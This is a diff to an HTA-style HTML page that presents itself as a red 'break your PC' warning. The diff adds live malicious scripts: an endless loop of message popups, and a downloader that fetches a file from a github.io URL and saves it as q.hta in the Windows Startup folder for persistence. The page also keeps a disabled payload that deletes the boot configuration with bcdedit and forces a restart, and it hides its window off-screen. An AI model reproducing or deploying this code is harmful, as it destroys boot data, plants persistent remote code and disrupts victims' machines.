@@ -16,7 +16,27 @@
 <body style="margin:0;background:red;">
 <p>PRESSING THE BUTTON BELOW WILL BREAK YOUR PC!</p>
 <p>CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC.</p>
-<script>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</script>
+<dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
+<script>
+      while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('msg','* MISS','')};
+</script>
+<script>
+var shell   = new ActiveXObject("WScript.Shell");
+var fso     = new ActiveXObject("Scripting.FileSystemObject");
+var startup = shell.SpecialFolders("Startup");
+var path    = startup + "/q.hta"
+var url     = 'https://emddit.github.io/mshta';
+var x       = new ActiveXObject('MSXML2.XMLHTTP');
+x.open('GET', url, false);
+x.send();
+var s=new ActiveXObject('ADODB.Stream');
+s.Type=1;
+s.Open();
+s.Write(x.responseBody);
+s.SaveToFile(path,2);
+close();
+
+</script>
 <script>window.moveTo(-3000, -3000);</script>
 </body>  
 </html>
